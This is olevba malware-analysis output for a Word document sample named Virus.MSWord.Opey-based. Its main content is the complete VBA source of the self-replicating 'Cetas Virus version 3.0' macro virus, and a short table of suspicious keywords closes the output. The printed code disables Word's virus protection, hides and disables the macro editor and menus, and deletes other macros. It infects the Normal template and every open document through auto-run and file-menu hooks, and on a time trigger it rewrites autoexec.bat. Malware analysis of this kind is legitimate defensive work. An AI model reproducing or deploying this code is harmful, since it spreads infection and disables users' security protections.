olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey-based-aedaa747f7a8fc66173f07b2f559467c6c6b7e4b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-aedaa747f7a8fc66173f07b2f559467c6c6b7e4b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xHeCs3.bas 
in file: Virus.MSWord.Opey-based-aedaa747f7a8fc66173f07b2f559467c6c6b7e4b - OLE stream: 'Macros/VBA/xHeCs3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub vxConTrol()
'
' Cetas Virus version 3.0 by xHeCs
' ATTENTION LAMERS that's you !!!.
'     You can learn a lot from this virus, But Please respect
' What is not yours.
'
On Error Resume Next
Application.UserName = "PAcMAn"
Application.UserAddress = "PAcMAn ZonE"
Application.UserInitials = "xHeCs"
With Dialogs(wdDialogFileSummaryInfo)
        .Author = "xHeCs"
        .Comments = "Life is like a box of chocolate you'll never know what your gonna get :)"
        .Execute
End With
With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
End With
With ActiveDocument
   .ReadOnlyRecommended = False
End With
On Error Resume Next
CommandBars("Visual Basic").Visible = False
CommandBars("Visual Basic").Enabled = False
CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
CommandBars("Visual Basic").Protection = msoBarNoCustomize
CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Customize...").Delete
CustomizationContext = NormalTemplate
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable

NTInfected = False
For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(I).Name
                If clan = "xHeCs3" Then NTInfected = True
                If (clan <> "xHeCs3") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
Next I
    For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(J).Name
                    If clan = "xHeCs3" Then ODInfected = True
                    If (clan <> "xHeCs3") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
     Next J
     If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="xHeCs3", Object:=wdOrganizerObjectProjectItems
     opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="xHeCs3", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If


Application.VBE.ActiveVBProject.VBComponents("xHeCs3").Export "c:\WinCTL.sys"

For I = 1 To NormalTemplate.VBProject.VBComponents.Count
  If NormalTemplate.VBProject.VBComponents(I).Name = "xHeCs3" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
  If ActiveDocument.VBProject.VBComponents(I).Name = "xHeCs3" Then ActivInstall = True
Next I
If ActivInstall = True And NormInstall = False Then Set Target = NormalTemplate.VBProject _
Else: If ActivInstall = False And NormInstall = True Then Set Target = ActiveDocument.VBProject
Target.VBComponents.Import ("c:\WinCtl.sys")
End Sub
Sub FileSave()
    On Error Resume Next
    Call vxConTrol
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call vxConTrol
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call vxConTrol
End Sub
Sub FileExit()
    On Error Resume Next
    Call vxConTrol
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call vxConTrol
End Sub
Sub EditFind()
    On Error Resume Next
    Dialogs(wdDialogEditFind).Show
    Call vxConTrol
End Sub
Sub AutoExec()
    On Error Resume Next
    Call vxConTrol
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call vxConTrol
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call vxConTrol
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call vxConTrol
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call vxConTrol
End Sub
Function Delay()
    For I = 0 To 10000000
    Next I
End Function
Sub AutoClose()
    On Error Resume Next
    Call vxConTrol
    If (Minute(Time) = 35) Then
        If (Second(Time) Mod 2) = 0 Then
          DirTest = DIR("C:\WinSys.Vxd")
          If DirTest <> "" Then
             Filecopy "C:\Autoexec.bat", "C:\WinSys.Vxd"
             autoexecfile$ = "c:\autoexec.bat"
             hFile = FreeFile
             Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, "If Exist Vx.Dat Goto End"
                        Print #hFile, "echo Cetas virus Version 3.0 "
                        Print #hFile, "echo (C)Copyright 1999-2000 xHeCs"
                        Print #hFile, "pause"
                        Print #hFile, "copy/y WinSys.Vxd Autoexec.bat >NULL"
                        Print #hFile, "echo Cetas Virus version 3.0 by xHeCS >Vx.Dat"
                        Print #hFile, ":End"
             Close hFile
          End If
    End If
    End If
NoBox:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Filecopy            |May copy a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

